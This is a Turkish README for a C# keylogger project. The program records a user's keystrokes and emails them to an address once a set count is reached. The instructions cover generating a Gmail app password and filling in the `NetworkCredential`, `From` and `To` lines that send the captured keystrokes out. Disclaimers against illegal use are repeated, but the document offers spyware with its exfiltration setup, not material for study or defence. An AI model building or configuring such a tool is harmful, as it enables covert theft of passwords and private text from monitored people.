# Keylogger Uygulaması

Bu, basit bir keylogger uygulamasıdır. Uygulama, kullanıcının tuş vuruşlarını kaydedecek ve belirli bir sayıda tuş vuruşunu yakaladığında bu bilgileri belirtilen bir e-posta adresine gönderecektir. **Bu tür bir yazılımın etik olmayan veya yasa dışı amaçlarla kullanılması kesinlikle tavsiye edilmez!**

## Kullanım Talimatları

1. Uygulama şifrenizi belirlemek için "Uygulama Şifreleri" özelliğini kullanın:

   - [Google Hesap Ayarları](https://myaccount.google.com/) sayfasına gidin ve "Güvenlik" bölümüne tıklayın.
   - "Uygulama Şifreleri" altında "Uygulama Şifreleri Oluştur" seçeneğine gidin.
   - Şifrenizi kolaylıkla hatırlamak için "Keylogger Uygulaması" gibi bir uygulama adı seçin ve "Oluştur" düğmesine tıklayın.
   - Oluşturulan şifreyi bir yere kopyalayın, çünkü bu şifreyi tekrar görüntüleme şansınız olmayacaktır.

2. Daha önce oluşturduğunuz şifreyi kod içindeki `client.Credentials` satırında `sifre` yerine yapıştırın:

   ```csharp
   client.Credentials = new System.Net.NetworkCredential("ornek@gmail.com", "BURAYA_OLUSTURDUGUNUZ_SIFRE");
    ```

3. E-posta gönderme hedefini ve alıcıyı belirleyin:
 
   ```csharp
   mailMessage.From = new MailAddress("ornek@gmail.com");
   mailMessage.To.Add("ornek@gmail.com");
   ```

**Lütfen unutmayın:** Bu tür bir yazılımın etik olmayan veya yasa dışı amaçlarla kullanılması kesinlikle tavsiye edilmez. Kötü amaçlı kullanım, gizlilik ihlallerine neden olabilir ve yasal sonuçlar doğurabilir.


## Lisans

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

Bu projeyi [MIT Lisansı](https://opensource.org/licenses/MIT) altında lisansladık. Lisansın tam açıklamasını burada bulabilirsiniz.
